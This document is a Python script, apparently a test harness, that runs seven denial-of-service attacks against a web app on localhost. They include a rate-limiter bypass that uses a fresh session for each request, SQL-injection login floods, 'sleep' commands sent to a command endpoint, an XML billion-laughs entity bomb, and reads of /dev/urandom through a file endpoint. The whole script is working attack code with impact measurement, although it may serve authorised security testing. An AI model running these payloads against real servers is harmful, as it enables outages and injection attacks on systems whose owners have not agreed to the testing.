#!/usr/bin/env python3
"""
Denial of Service (DoS) Test Script
Tests 7 attack vectors against multiple endpoints
Target: Rate limiter bypass + resource exhaustion
"""

import requests
import sys
import time
import threading
from io import BytesIO

BASE_URL = "http://localhost:5000"
BURST_COUNT = 50
REQUEST_TIMEOUT = 5

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
BOLD = "\033[1m"
RESET = "\033[0m"


def get_fresh_session():
    """Create a new session with fresh cookies to bypass rate limiter"""
    s = requests.Session()
    s.get(BASE_URL + "/", timeout=REQUEST_TIMEOUT)
    return s


def baseline_single_request(method, endpoint, **kwargs):
    """Measure baseline response time for a single request"""
    try:
        start = time.time()
        if method == "GET":
            resp = requests.get(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT)
        else:
            resp = requests.post(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT, **kwargs)
        elapsed = time.time() - start
        return elapsed, resp.status_code
    except Exception:
        return None, None


def flood_endpoint(method, endpoint, payload_data, count=BURST_COUNT):
    """
    Send burst of requests and measure degradation.
    Returns metrics dict.
    """
    results = {"successes": 0, "timeouts": 0, "errors_429": 0, "errors_503": 0, "other_errors": 0, "response_times": [], "failures": 0}
    lock = threading.Lock()

    def send_one():
        try:
            session = get_fresh_session()
            start = time.time()
            if method == "GET":
                resp = session.get(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT)
            else:
                resp = session.post(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT, **payload_data)
            elapsed = time.time() - start

            with lock:
                results["response_times"].append(elapsed)
                if resp.status_code == 200:
                    results["successes"] += 1
                elif resp.status_code == 429:
                    results["errors_429"] += 1
                elif resp.status_code == 503:
                    results["errors_503"] += 1
                else:
                    results["other_errors"] += 1
        except requests.exceptions.Timeout:
            with lock:
                results["timeouts"] += 1
        except Exception:
            with lock:
                results["failures"] += 1

    threads = []
    batch_size = 10
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        threads = []
        for _ in range(batch_start, batch_end):
            t = threading.Thread(target=send_one)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    return results


def evaluate_baseline_vs_flood(baseline_time, results):
    """Determine if DoS impact was detected"""
    if not baseline_time:
        return len(results["response_times"]) > 0

    if results["timeouts"] > 0:
        return True
    if results["errors_429"] > 0:
        return True
    if results["errors_503"] > 0:
        return True
    if results["failures"] > 0:
        return True

    if results["response_times"]:
        avg_flood = sum(results["response_times"]) / len(results["response_times"])
        if avg_flood > baseline_time * 3:
            return True

    return False


PAYLOADS = [
    {
        "id": 1,
        "name": "HTTP Flood (GET)",
        "endpoint": "/",
        "method": "GET",
        "data": {},
        "description": "50 rapid GET requests with fresh sessions bypass rate limiter",
    },
    {
        "id": 2,
        "name": "Auth Flood (POST /login)",
        "endpoint": "/login",
        "method": "POST",
        "data": {"data": {"username": "admin' OR '1'='1' OR '1'='1' OR '1'='1' OR '1'='1'--", "password": "x" * 500}},
        "description": "50 POSTs with large SQLi payloads, expensive DB queries + logging",
    },
    {
        "id": 3,
        "name": "Command Exhaustion",
        "endpoint": "/cmd",
        "method": "POST",
        "data": {"data": {"command": "sleep 10"}},
        "description": "50 'sleep 10' commands, worker thread starvation",
    },
    {
        "id": 4,
        "name": "Upload Flood",
        "endpoint": "/upload",
        "method": "POST",
        "data": {"files": {"file": ("dos_test.txt", b"A" * 10000, "text/plain")}},
        "description": "50 file uploads, SHA256 hashing + ClamAV scanning",
    },
    {
        "id": 5,
        "name": "XML Billion Laughs",
        "endpoint": "/api/xml",
        "method": "POST",
        "data": {"data": '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "0123456789"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">]><data>&f;</data>'},
        "description": "50 XML entity expansion bombs, CPU/memory exhaustion",
    },
    {
        "id": 6,
        "name": "Feedback Flood",
        "endpoint": "/feedback",
        "method": "POST",
        "data": {"data": {"name": "dos_user", "message": "A" * 5000}},
        "description": "50 large feedback submissions, DB INSERT + request logging",
    },
    {
        "id": 7,
        "name": "I/O Exhaustion",
        "endpoint": "/file",
        "method": "POST",
        "data": {"data": {"filename": "/dev/urandom"}},
        "description": "50 requests to read /dev/urandom, I/O exhaustion",
    },
]


def test_payload(payload):
    """Test a single DoS payload"""
    print(f"  {BLUE}[~]{RESET} Measuring baseline for {payload['name']}...")
    baseline_time, baseline_status = baseline_single_request(
        payload["method"], payload["endpoint"], **payload.get("data", {})
    )

    if baseline_time:
        print(f"  {BLUE}[~]{RESET} Baseline: {baseline_time:.3f}s (HTTP {baseline_status})")
    else:
        print(f"  {YELLOW}[!]{RESET} Baseline unavailable (endpoint may be slow or unreachable)")

    print(f"  {BLUE}[~]{RESET} Sending {BURST_COUNT} requests in concurrent batches...")
    start = time.time()
    results = flood_endpoint(
        payload["method"], payload["endpoint"], payload.get("data", {}), BURST_COUNT
    )
    flood_duration = time.time() - start

    avg_response = sum(results["response_times"]) / len(results["response_times"]) if results["response_times"] else 0

    passed = evaluate_baseline_vs_flood(baseline_time, results)

    detail = (
        f"Burst completed in {flood_duration:.2f}s | "
        f"Success: {results['successes']} | "
        f"429: {results['errors_429']} | "
        f"503: {results['errors_503']} | "
        f"Timeouts: {results['timeouts']} | "
        f"Failures: {results['failures']} | "
        f"Avg response: {avg_response:.3f}s"
    )

    return {
        "id": payload["id"],
        "name": payload["name"],
        "description": payload["description"],
        "passed": passed,
        "detail": detail,
    }


def print_report(results):
    """Print formatted test results"""
    print("\n" + "=" * 70)
    print(f"{BOLD}DoS Attack Test Results - {BURST_COUNT} requests per vector{RESET}")
    print("=" * 70)

    passed_count = sum(1 for r in results if r["passed"])

    for r in results:
        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
        print(f"\n  {BOLD}[{status}]{RESET} #{r['id']}: {r['name']}")
        print(f"    {BOLD}Attack:{RESET} {r['description']}")
        print(f"    {BOLD}Metrics:{RESET} {r['detail']}")

    print(f"\n{BOLD}Summary: {passed_count}/{len(results)} attack vectors showed measurable impact{RESET}")
    if passed_count >= 5:
        print(f"{GREEN}Significant DoS surface area detected. Server is vulnerable to resource exhaustion.{RESET}")
    elif passed_count >= 3:
        print(f"{YELLOW}Moderate DoS surface area. Some vectors caused measurable degradation.{RESET}")
    else:
        print(f"{RED}Limited DoS impact detected. Server handled the load well or rate limiter was effective.{RESET}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    print(f"{BOLD}[*] Starting DoS Attack tests against {BASE_URL}{RESET}")
    print(f"[*] {BURST_COUNT} requests per payload, {REQUEST_TIMEOUT}s timeout, fresh sessions for rate limiter bypass")
    print(f"[*] Testing {len(PAYLOADS)} attack vectors...\n")

    results = []
    for p in PAYLOADS:
        print(f"{'='*50}")
        print(f"{BOLD}Payload #{p['id']}: {p['name']}{RESET}")
        print(f"{'='*50}")
        r = test_payload(p)
        results.append(r)
        print()

    print_report(results)
    sys.exit(0 if any(r["passed"] for r in results) else 1)
